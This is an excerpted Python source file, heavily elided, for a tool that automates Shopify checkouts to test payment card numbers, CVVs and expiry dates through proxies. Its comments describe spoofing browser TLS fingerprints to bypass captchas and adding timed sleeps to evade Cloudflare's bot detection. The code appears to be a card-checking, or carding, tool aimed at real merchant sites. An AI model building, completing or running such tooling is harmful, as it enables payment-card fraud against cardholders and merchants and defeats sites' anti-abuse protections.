...
class ShopifyCheckoutSession:
    ...
    def get_navigate_headers(self) -> Dict[str, str]:
        """Headers strictly for standard page navigation. Let curl_cffi handle Accept, UA, etc."""
        return {
    ...
    def get_graphql_headers(self) -> Dict[str, str]:
        """Headers strictly tuned for GraphQL/Fetch endpoints."""
        h = {
        ...
        if self.source_token: h['x-checkout-web-source-id'] = self.source_token
        return h
    ...
    async def add_to_cart(self, session) -> Tuple[bool, str]:
        ...
        try:
            resp = await session.post(cart_url, data=f'id={self.variant_id}&quantity=1', headers=cart_headers)
            if resp.status_code != 200:
                cart_headers['content-type'] = 'application/json'
                r2 = await session.post(cart_url, json={'items': [{'id': int(self.variant_id), 'quantity': 1}]}, headers=cart_headers)
    ...
    async def init_checkout(self, session) -> Tuple[bool, str]:
        try:
            # We strictly execute a GET request mirroring a human click from the cart
            ...
            'variables': {
                ...
                'merchandise': {
                    'merchandiseLines': [{
                        ...
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                            }
                        },
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True},
        ...
        for attempt in range(3):
            ...
            try:
                ...
                if data:
                    ...
                    sp = data.get('sellerProposal', {})
                    if sp.get('tax', {}).get('__typename') == 'PendingTerms' or sp.get('delivery', {}).get('__typename') == 'PendingTerms':
                        await asyncio.sleep(1.5)
                        continue
...
async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None) -> Tuple[bool, str, str, str, str, str, float, float]:
    ...
    try:
        # Utilizing CFFI AsyncSession mathematically spoofs the TLS fingerprint
        # DO NOT manually set User-Agent/Sec-CH here, impersonate="chrome120" manages it strictly to bypass Captcha
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
            ...
            # Artificial sleep to mitigate Cloudflare's strict time-based heuristics (Bots don't wait 1.5s between add and checkout)
